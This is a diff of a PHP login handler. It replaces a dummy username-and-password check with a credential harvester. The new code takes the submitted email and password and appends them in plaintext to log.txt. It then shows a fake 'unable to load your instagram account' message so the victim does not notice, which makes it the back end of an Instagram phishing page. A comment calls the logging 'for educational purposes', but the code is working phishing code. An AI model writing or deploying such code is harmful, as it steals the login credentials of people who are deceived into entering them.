@@ -1,22 +1,15 @@
 <?php
-// Dummy user data
-$valid_username = "user";
-$valid_password = "password123";
-
-// Check if the form was submitted
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $username = $_POST['username'];
+    $email = $_POST['email'];
     $password = $_POST['password'];
+    
+    // Log the captured data (for educational purposes)
+    $file = fopen("log.txt", "a");
+    fwrite($file, "Email: $email | Password: $password\n");
+    fclose($file);
+    
+    // echo "Login failed. Please try again.";
 
-    if ($username === $valid_username && $password === $valid_password) {
-        header("Location: dashboard.php");
-        exit();
-    } else {
-        $error = urlencode("Invalid username or password.");
-        header("Location: index.php?error=$error");
-        exit();
-    }
-} else {
-    header("Location: index.php");
-    exit();
-}
+?>
+
+<h1>unable to load your instagram account, please try again later</h1>
+<?php
